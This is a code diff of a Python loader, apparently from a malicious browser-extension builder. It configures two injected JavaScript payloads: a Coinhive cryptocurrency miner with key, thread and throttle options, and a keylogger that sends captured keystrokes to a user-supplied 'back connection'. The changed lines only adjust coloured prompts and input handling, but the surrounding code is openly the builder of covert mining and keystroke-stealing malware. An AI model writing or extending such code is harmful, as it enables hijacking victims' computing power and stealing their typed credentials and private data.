@@ -48,20 +48,20 @@ class Loader :
 
 				modules = "modules/currency/coinhive/coinhive.js" # Javascript file to inject into background
 
-				print("[!] Configuration of module {}".format(modules))
+				print((Colors().yellows("[!] Configuration of module {}".format(modules))))
 
-				apikey = raw_input("{}".format(Colors().purpl("[+] Set coinhive public key: ")))
-				thread = raw_input("{}".format(Colors().purpl("[+] Set coinhive threads: ")))
-				autoThreads = raw_input("{}".format(Colors().purpl("[+] Set coinhive autoThreads: ")))
-				throttle = float(input("{}".format(Colors().purpl("[+] Set coinhive throttle: "))))
-				forceASMJS = raw_input("{}".format(Colors().purpl("[+] Set coinhive forceASMJS: ")))
+				apikey = raw_input("{}".format(Colors().status("[+] Set coinhive public key: ")))
+				thread = raw_input("{}".format(Colors().status("[+] Set coinhive threads: ")))
+				autoThreads = raw_input("{}".format(Colors().status("[+] Set coinhive autoThreads: ")))
+				throttle = raw_input("{}".format(Colors().status("[+] Set coinhive throttle: ")))
+				forceASMJS = raw_input("{}".format(Colors().status("[+] Set coinhive forceASMJS: ")))
 
 				options = "{}{}{}, {}thread:{}, autoThreads:{}, throttle: {}, forceASMJS: {}{}".format('"',apikey,'"',"{",thread, autoThreads, throttle, forceASMJS,"}") # Options
 
 			elif self.module == "keylogger" :
 
 				modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
-				print("[!] Configuration of module {}".format(modules))
+				print((Colors().yellows("[!] Configuration of module {}".format(modules))))
 				connection = raw_input("{}".format(Colors().status("[+] Set the back connection: ")))
 				options = "{}".format(connection)
 				
